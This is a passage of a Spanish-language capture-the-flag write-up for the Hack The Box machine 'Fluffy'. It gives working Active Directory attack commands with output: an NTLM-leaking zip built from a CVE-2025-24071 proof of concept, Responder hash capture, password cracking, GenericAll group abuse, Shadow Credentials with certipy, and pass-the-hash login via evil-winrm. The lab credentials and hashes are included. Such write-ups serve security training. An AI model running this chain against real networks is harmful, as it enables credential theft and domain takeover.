+</span></span><span style="display:flex;"><span>    print(<span style="color:#a5d6ff">&#34;completed&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> <span style="color:#79c0ff">__name__</span> <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>El cual lo podemos descargar directamente con <code>wget</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/0x6rss/CVE-2025-24071_PoC/refs/heads/main/poc.py
+</span></span></code></pre></div><p>Para utilizarlo es bien simple, solo nos pide el nombre del archivo, y la IP a la cual el usuario en la máquina víctima se tendrá que autenticar:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 poc.py 
+</span></span><span style="display:flex;"><span>Enter your file name: exploit.zip
+</span></span><span style="display:flex;"><span>Enter IP <span style="color:#ff7b72;font-weight:bold">(</span>EX: 192.168.1.162<span style="color:#ff7b72;font-weight:bold">)</span>: 10.10.14.48
+</span></span><span style="display:flex;"><span>completed
+</span></span></code></pre></div><p>Utilizamos Responder para escuchar en la interfaz de red y capturar posibles intentos de autenticación NTLMv2. Si el usuario interactúa con el archivo malicioso y Windows intenta autenticarse contra nuestro equipo, podremos capturar el desafío-respuesta NTLMv2 correspondiente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo responder -I tun0         
+</span></span><span style="display:flex;"><span>                                         __
+</span></span><span style="display:flex;"><span>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+</span></span><span style="display:flex;"><span>  |   _|  -__|__ --|  _  |  _  |     |  _  <span style="color:#ff7b72;font-weight:bold">||</span>  -__|   _|
+</span></span><span style="display:flex;"><span>  |__| |_____|_____|   __|_____|__|__|_____<span style="color:#ff7b72;font-weight:bold">||</span>_____|__|
+</span></span><span style="display:flex;"><span>                   |__|            
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Tips jar:
+</span></span><span style="display:flex;"><span>    USDT -&gt; 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
+</span></span><span style="display:flex;"><span>    BTC  -&gt; bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Poisoners:
+</span></span><span style="display:flex;"><span>    LLMNR                      <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    NBT-NS                     <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    MDNS                       <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    DNS                        <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    DHCP                       <span style="color:#ff7b72;font-weight:bold">[</span>OFF<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    DHCPv6                     <span style="color:#ff7b72;font-weight:bold">[</span>OFF<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Servers:
+</span></span><span style="display:flex;"><span>    HTTP server                <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    HTTPS server                <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    WPAD proxy                 <span style="color:#ff7b72;font-weight:bold">[</span>OFF<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    Auth proxy                 <span style="color:#ff7b72;font-weight:bold">[</span>OFF<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    SMB server                 <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    Kerberos server            <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>    SQL server                 <span style="color:#ff7b72;font-weight:bold">[</span>ON<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span></code></pre></div><p>Por lo cual ahora solo quedaría subir nuestro <code>exploit.zip</code> mediante <code>SMB</code>, como se muestra a continuación:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //10.129.232.88/IT -U <span style="color:#a5d6ff">&#39;fluffy.htb\j.fleischman%J0elTHEM4n1990!&#39;</span>
+</span></span><span style="display:flex;"><span>Try <span style="color:#a5d6ff">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#79c0ff">\&gt;</span> put exploit.zip
+</span></span><span style="display:flex;"><span>putting file exploit.zip as <span style="color:#79c0ff">\e</span>xploit.zip <span style="color:#ff7b72;font-weight:bold">(</span>0.7 kB/s<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">(</span>average 0.7 kB/s<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span></code></pre></div><p>Transcurridos unos segundos, observamos que el usuario <code>p.agila</code> intentó autenticarse contra nuestro equipo. Como resultado, Responder capturó su respuesta de autenticación <code>NTLMv2</code>, tal como se muestra a continuación:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo responder -I tun0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Listening <span style="color:#ff7b72">for</span> events...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>SMB<span style="color:#ff7b72;font-weight:bold">]</span> NTLMv2-SSP Client   : 10.129.232.88
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>SMB<span style="color:#ff7b72;font-weight:bold">]</span> NTLMv2-SSP Username : FLUFFY<span style="color:#79c0ff">\p</span>.agila
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>SMB<span style="color:#ff7b72;font-weight:bold">]</span> NTLMv2-SSP Hash     : p.agila::FLUFFY:04880bfb56241242:6E38008C80389AB7C132F4239A2340F3:010100000000000000CF6E9E4658DD01483074EC54F7069200000000020008004F0053005600500001001E00570049004E002D0036005300470058003200410041005A0055003600470004003400570049004E002D0036005300470058003200410041005A005500360047002E004F005300560050002E004C004F00430041004C00030014004F005300560050002E004C004F00430041004C00050014004F005300560050002E004C004F00430041004C000700080000CF6E9E4658DD01060004000200000008003000300000000000000001000000002000000CD0725A276945A97F0274700847BE5E7D32628FB940CB09993DEAC668BA3C090A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E003400380000
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">00000000000000</span>
+</span></span></code></pre></div><p>Una vez capturada la respuesta de autenticación NTLMv2 del usuario <code>p.agila</code>, utilizamos John the Ripper para intentar recuperar su contraseña mediante un ataque de diccionario.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --format<span style="color:#ff7b72;font-weight:bold">=</span>netntlmv2 --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt hash_p.agila
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#a5d6ff">1</span> password hash <span style="color:#ff7b72;font-weight:bold">(</span>netntlmv2, NTLMv2 C/R <span style="color:#ff7b72;font-weight:bold">[</span>MD4 HMAC-MD5 32/64<span style="color:#ff7b72;font-weight:bold">])</span>
+</span></span><span style="display:flex;"><span>Will run <span style="color:#a5d6ff">6</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#a5d6ff">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#ff7b72">for</span> status
+</span></span><span style="display:flex;"><span>prometheusx-303  <span style="color:#ff7b72;font-weight:bold">(</span>p.agila<span style="color:#ff7b72;font-weight:bold">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE <span style="color:#ff7b72;font-weight:bold">(</span>2026-10-09 23:38<span style="color:#ff7b72;font-weight:bold">)</span> 1.086g/s 4911Kp/s 4911Kc/s 4911KC/s proquis..prod0789
+</span></span><span style="display:flex;"><span>Use the <span style="color:#a5d6ff">&#34;--show --format=netntlmv2&#34;</span> options to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Obteniendo la contraseña <code>prometheusx-303</code> del usuario <code>p.agila</code>, ahora con ella podemos intentar enumerar por recursos compartidos nuevos, o intentar conectarnos por <code>winrm</code>, pero todo esto es en vano.</p>
+<h1 id="enumeración-de-active-directory">
+  Enumeración de Active Directory
+  <a class="heading-link" href="#enumeraci%c3%b3n-de-active-directory">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Para enumerar y encontrar vías de movimiento lateral y escalada de privilegios en este entorno AD, utilizaremos la herramienta <code>BloodHound</code>.</p>
+<h2 id="recolectar-datos-zip">
+  Recolectar datos .zip
+  <a class="heading-link" href="#recolectar-datos-zip">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Como tenemos credenciales de un usuario nuevo válido en el dominio, utilizaremos <code>bloodhound-python</code>, para recolectar información en un zip, de la siguiente manera</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodhound-python -u <span style="color:#a5d6ff">&#39;p.agila&#39;</span> -p <span style="color:#a5d6ff">&#39;prometheusx-303&#39;</span> -d fluffy.htb -ns 10.129.232.88 -c All --zip
+</span></span></code></pre></div><p>Al utilizar por primera vez el comando, nos mostrará un error por el desfase horario entre nuestra máquina atacante y el AD.</p>
+<p>Para solucionar esto utilizaremos <code>faketime</code> y <code>ntpdate</code> de la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72">$(</span>ntpdate -q 10.129.232.88 | cut -d <span style="color:#a5d6ff">&#39; &#39;</span> -f 1,2<span style="color:#ff7b72">)</span><span style="color:#a5d6ff">&#34;</span> bloodhound-python -u <span style="color:#a5d6ff">&#39;p.agila&#39;</span> -p <span style="color:#a5d6ff">&#39;prometheusx-303&#39;</span> -d fluffy.htb -ns 10.129.232.88 -c All --zip
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>INFO: BloodHound.py <span style="color:#ff7b72">for</span> BloodHound LEGACY <span style="color:#ff7b72;font-weight:bold">(</span>BloodHound 4.2 and 4.3<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>INFO: Found AD domain: fluffy.htb
+</span></span><span style="display:flex;"><span>INFO: Getting TGT <span style="color:#ff7b72">for</span> user
+</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: dc01.fluffy.htb
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#a5d6ff">1</span> domains
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#a5d6ff">1</span> domains in the forest
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#a5d6ff">1</span> computers
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#a5d6ff">10</span> users
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#a5d6ff">54</span> groups
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#a5d6ff">3</span> gpos
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#a5d6ff">1</span> ous
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#a5d6ff">19</span> containers
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#a5d6ff">0</span> trusts
+</span></span><span style="display:flex;"><span>INFO: Starting computer enumeration with <span style="color:#a5d6ff">10</span> workers
+</span></span><span style="display:flex;"><span>INFO: Querying computer: DC01.fluffy.htb
+</span></span><span style="display:flex;"><span>INFO: Done in 00M 32S
+</span></span><span style="display:flex;"><span>INFO: Compressing output into 20261010064350_bloodhound.zip
+</span></span></code></pre></div><p>Así obtenemos nuestro archivo <code>.zip</code> que deberemos cargar en <code>Bloodhound</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -la 20261010064350_bloodhound.zip 
+</span></span><span style="display:flex;"><span>-rw-rw-r-- <span style="color:#a5d6ff">1</span> celero0 celero0 <span style="color:#a5d6ff">145881</span> Oct  <span style="color:#a5d6ff">9</span> 23:45 20261010064350_bloodhound.zip
+</span></span></code></pre></div><h2 id="preparar-docker-con-bloodhound">
+  Preparar docker con Bloodhound
+  <a class="heading-link" href="#preparar-docker-con-bloodhound">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para crear nuestro contenedor con <code>Bloodhound</code> descargaremos el <code>docker-compose</code> desde la siguiente página web <a href="https://0ut3r.space/2024/04/22/bloodhound-ce-and-docker/"  class="external-link" target="_blank" rel="noopener">https://0ut3r.space/2024/04/22/bloodhound-ce-and-docker/</a></p>
+<p>Basta con realizar el siguiente comando para descargarlo</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/SpecterOps/bloodhound/main/examples/docker-compose/docker-compose.yml
+</span></span></code></pre></div><p>Una vez descargada deberemos iniciar el contenedor con el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo docker-compose up -d
+</span></span></code></pre></div><p>Posteriormente accedemos desde nuestro navegador a <code>localhost:8080</code> y se nos abrirá la interfaz de <code>Bloodhound</code></p>
+<img src="/images/Pasted image 20260306232542.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>En el apartado de correo pondremos <code>admin</code>, y para obtener la contraseña habrá que leer los logs de nuestro contenedor con el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker-compose logs
+</span></span></code></pre></div><img src="/images/Pasted image 20260306232632.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>En este apartado deberemos subir el <code>.zip</code> que obtuvimos anteriormente</p>
+<img src="/images/Pasted image 20260306232728.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y luego vamos a <code>Administration</code>, y esperamos hasta que aparezca <code>Complete</code></p>
+<img src="/images/Pasted image 20260306232824.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="análisis-de-ad-con-bloodhound">
+  Análisis de AD con BloodHound
+  <a class="heading-link" href="#an%c3%a1lisis-de-ad-con-bloodhound">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Como disponemos de las credenciales del usuario <code>p.agila</code>, procedemos a analizar sus propiedades y los permisos asociados a su cuenta dentro del dominio.</p>
+<p>Durante la enumeración, observamos que <code>p.agila</code> es miembro del grupo <code>Service Account Managers</code>. Asimismo, identificamos que este grupo posee permisos <code>GenericAll</code> sobre el grupo <code>Service Accounts</code>, lo que le otorga control total sobre el objeto de dicho grupo en Active Directory.</p>
+<p>Este permiso puede permitir modificar distintas propiedades del grupo, incluida su membresía (podemos agregar o quitar usuarios del grupo).</p>
+<img src="/images/Pasted image 20261010005454.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por lo cual procederemos a agregar al usuario <code>p.agila</code> al grupo <code>Service Accounts</code>, con el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net rpc group addmem <span style="color:#a5d6ff">&#34;Service Accounts&#34;</span> <span style="color:#a5d6ff">&#34;p.agila&#34;</span> -U <span style="color:#a5d6ff">&#34;fluffy.htb&#34;</span>/<span style="color:#a5d6ff">&#34;p.agila&#34;</span>%<span style="color:#a5d6ff">&#34;prometheusx-303&#34;</span> -S <span style="color:#a5d6ff">&#34;fluffy.htb&#34;</span>
+</span></span></code></pre></div><p>Para comprobar que nuestro usuario ha sido agregado exitosamente al grupo, podemos utilizar el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net rpc group members <span style="color:#a5d6ff">&#34;Service Accounts&#34;</span> -U <span style="color:#a5d6ff">&#34;fluffy.htb&#34;</span>/<span style="color:#a5d6ff">&#34;p.agila&#34;</span>%<span style="color:#a5d6ff">&#34;prometheusx-303&#34;</span> -S <span style="color:#a5d6ff">&#34;fluffy.htb&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>FLUFFY<span style="color:#79c0ff">\c</span>a_svc
+</span></span><span style="display:flex;"><span>FLUFFY<span style="color:#79c0ff">\l</span>dap_svc
+</span></span><span style="display:flex;"><span>FLUFFY<span style="color:#79c0ff">\p</span>.agila
+</span></span><span style="display:flex;"><span>FLUFFY<span style="color:#79c0ff">\w</span>inrm_svc
+</span></span></code></pre></div><p>Y vemos que efectivamente <code>p.agila</code> es miembro del grupo <code>Service Accounts</code>.</p>
+<p>Revisando por los permisos y propiedades asociados al grupo <code>Service Accounts</code>, nos encontramos que este grupo posee permisos <code>GenericWrite</code> sobre las posibles cuentas de servicio <code>CA_SVC</code>, <code>LDAP_SVC</code>, y <code>WINRM_SVC</code>.</p>
+<img src="/images/Pasted image 20261010010827.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h2 id="shadow-credentials-con-certipy">
+  Shadow Credentials con Certipy
+  <a class="heading-link" href="#shadow-credentials-con-certipy">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Esto, junto con los demás permisos identificados, podría permitirnos llevar a cabo un ataque de tipo <code>Shadow Credentials</code>, mediante el cual podríamos autenticarnos como las cuentas de servicio afectadas y, dependiendo del procedimiento utilizado, obtener material de autenticación asociado a ellas, como su <code>HASH NT</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime <span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72">$(</span>ntpdate -q 10.129.232.88 | cut -d <span style="color:#a5d6ff">&#39; &#39;</span> -f 1,2<span style="color:#ff7b72">)</span><span style="color:#a5d6ff">&#34;</span> certipy-ad shadow auto -u <span style="color:#a5d6ff">&#39;p.agila@fluffy.htb&#39;</span> -p <span style="color:#a5d6ff">&#39;prometheusx-303&#39;</span> -account <span style="color:#a5d6ff">&#39;ca_svc&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Certipy v5.1.0 - by Oliver Lyak <span style="color:#ff7b72;font-weight:bold">(</span>ly4k<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>!<span style="color:#ff7b72;font-weight:bold">]</span> DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>!<span style="color:#ff7b72;font-weight:bold">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Targeting user <span style="color:#a5d6ff">&#39;ca_svc&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Generating certificate
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Certificate generated
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Generating Key Credential
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Key Credential generated with DeviceID <span style="color:#a5d6ff">&#39;a5572100aa244d508cb4cea91d6f5de5&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Adding Key Credential with device ID <span style="color:#a5d6ff">&#39;a5572100aa244d508cb4cea91d6f5de5&#39;</span> to the Key Credentials <span style="color:#ff7b72">for</span> <span style="color:#a5d6ff">&#39;ca_svc&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Successfully added Key Credential with device ID <span style="color:#a5d6ff">&#39;a5572100aa244d508cb4cea91d6f5de5&#39;</span> to the Key Credentials <span style="color:#ff7b72">for</span> <span style="color:#a5d6ff">&#39;ca_svc&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Authenticating as <span style="color:#a5d6ff">&#39;ca_svc&#39;</span> with the certificate
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Certificate identities:
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span>     No identities found in this certificate
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Using principal: <span style="color:#a5d6ff">&#39;ca_svc@fluffy.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Trying to get TGT...
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Got TGT
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Saving credential cache to <span style="color:#a5d6ff">&#39;ca_svc.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Wrote credential cache to <span style="color:#a5d6ff">&#39;ca_svc.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Trying to retrieve NT hash <span style="color:#ff7b72">for</span> <span style="color:#a5d6ff">&#39;ca_svc&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Restoring the old Key Credentials <span style="color:#ff7b72">for</span> <span style="color:#a5d6ff">&#39;ca_svc&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Successfully restored the old Key Credentials <span style="color:#ff7b72">for</span> <span style="color:#a5d6ff">&#39;ca_svc&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> NT hash <span style="color:#ff7b72">for</span> <span style="color:#a5d6ff">&#39;ca_svc&#39;</span>: ca0f4f9e9eb8a092addf53bb03fc98c8
+</span></span></code></pre></div><p>De la misma forma, obtenemos el <code>HASH NT</code>, de las demás cuentas de servicio:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ca_svc: ca0f4f9e9eb8a092addf53bb03fc98c8
+</span></span><span style="display:flex;"><span>winrm_svc: 33bd09dcd697600edf6b3a7af4875767
+</span></span><span style="display:flex;"><span>ldap_svc: 22151d74ba3de931a352cba1f9393a37
+</span></span></code></pre></div><p>Ahora con estos <code>HASH NT</code>, podemos autenticarnos utilizando la herramienta <code>evil-winrm</code>, como se muestra a continuación:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
+</span></span></code></pre></div><p>y obtenemos la <code>user.txt</code> en el escritorio de <code>winrm_svc</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\w</span>inrm_svc<span style="color:#79c0ff">\D</span>ocuments&gt; cd ..
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\w</span>inrm_svc&gt; cd Desktop
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\w</span>inrm_svc<span style="color:#79c0ff">\D</span>esktop&gt; type user.txt
+</span></span><span style="display:flex;"><span>e17a336fcc562c19551662c3a91902d5
+</span></span></code></pre></div><h1 id="escalada-de-privilegios">
+  Escalada de privilegios
+  <a class="heading-link" href="#escalada-de-privilegios">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Dado que hemos identificado una posible vía para obtener control sobre la cuenta de servicio <code>CA_SVC</code>, cuyo nombre podría hacer referencia a <em>Certificate Authority Service Account</em> (cuenta de servicio de una autoridad de certificación), procedemos a investigar si el dominio dispone de una infraestructura de certificados.</p>
+<p>Para ello, utilizamos <code>Certipy</code>, una herramienta que permite enumerar y analizar configuraciones de Active Directory Certificate Services (AD CS), con el objetivo de identificar autoridades de certificación, plantillas disponibles y posibles configuraciones inseguras.</p>
